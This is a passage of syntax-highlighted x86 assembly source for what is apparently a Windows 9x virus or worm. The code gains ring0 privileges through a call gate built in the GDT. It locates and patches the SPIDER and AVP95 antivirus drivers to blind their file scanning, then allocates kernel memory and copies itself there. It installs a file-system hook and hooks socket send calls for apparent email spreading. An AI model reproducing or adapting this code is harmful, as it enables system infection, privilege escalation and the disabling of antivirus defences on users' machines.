       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;get real addy :)</span><span class="sc0">
  </span><span class="sc5">@@isnt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">oldsend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_freel</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@suxx</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;make sure we're commited</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                            </span><span class="sc1">;jmp2ring0...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">sgdt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;get global descriptor table</span><span class="sc0">
       </span><span class="sc6">sidt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">idt</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;get interrupt table</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt.base</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt.limit</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc5">@@search_gdt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.limit_l</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ffffh</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.limit_h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc0">              </span><span class="sc1">;descriptor start at 0?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.base_l</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;and cover the whole range?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.base_m</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.base_h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">                   </span><span class="sc1">;is a flat descriptor!</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.access</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9bh</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@no_code</span><span class="sc0">                           </span><span class="sc1">;is a code descriptor?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt.base</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ring0_cs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;yes, save it!</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">
  </span><span class="sc5">@@no_code</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.access</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">93h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_descriptor</span><span class="sc0">                   </span><span class="sc1">;is a data descriptor?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt.base</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ring0_ds</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;yes, save it!</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc5">@@next_descriptor</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                               </span><span class="sc1">;our 2 descriptors found?</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@search_done</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@search_gdt</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@installed</span><span class="sc0">                         </span><span class="sc1">;flat descriptors dont found</span><span class="sc0">
  </span><span class="sc5">@@search_done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;esi=1st entry</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;edi=nul entry</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;nul entry isnt empty?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@installed</span><span class="sc0">                         </span><span class="sc1">;then already resident</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">                                   </span><span class="sc1">;backup 1st descriptor</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ring0_cs</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.selector</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;ring0 code selector</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.attrib</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ec00h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@over_ring0_code</span><span class="sc0">                  </span><span class="sc1">;[esp]=ring0 code</span><span class="sc0">

  </span><span class="sc5">@@ring0_code</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;setup data access</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">                                   </span><span class="sc1">;restore 1st descriptor</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.gdt.base</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.gdt.limit</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">protect</span><span class="sc0">                             </span><span class="sc1">;make gdt read only</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.idt.base</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.idt.limit</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">protect</span><span class="sc0">                             </span><span class="sc1">;make idt read only</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00270005h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">                                </span><span class="sc1">;VXDLDR GetDeviceList</span><span class="sc0">
  </span><span class="sc5">@@next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;VxD_Desc_Block *DI_DDB</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@next_vxd</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0C000000Ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;Name_0</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'DIPS'</span><span class="sc0">                       </span><span class="sc1">;'SPIDER  '</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'9PVA'</span><span class="sc0">                       </span><span class="sc1">;'AVP95   '</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next_vxd</span><span class="sc0">
  </span><span class="sc5">@@patch</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0000D500h</span><span class="sc0">                          </span><span class="sc1">;R0_OPENCREATFILE</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ScanVxd</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ScanVxd</span><span class="sc0">
  </span><span class="sc5">@@next_vxd</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;memory for email shitz</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">010053h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@fucked</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem_temp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@fucked</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)+</span><span class="sc2">4095</span><span class="sc4">)/</span><span class="sc2">4096</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">010053h</span><span class="sc0">                            </span><span class="sc1">;PageAlloc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@fuck</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;pop size/push &amp;hook</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">i_jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">socket_out</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">jmpcc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0850fh</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00400067h</span><span class="sc0">                          </span><span class="sc1">;install ifs hook</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">oldhook</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@fuck</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">retf</span><span class="sc0">

  </span><span class="sc5">@@over_ring0_code</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.offset_l</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;address of routine</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.offset_h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpfar.jmpofs32</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpfar.selectr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">;jmp to callback 1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ring0_ds</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;set ring0 data</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmpfar</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;call our ring0 code</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc5">@@installed</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;remove SEH</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem_temp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_ready</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@over</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">updater.inc</span><span class="sc0">

  </span><span class="sc5">@@over</span><span class="sc4">:</span><span class="sc0">
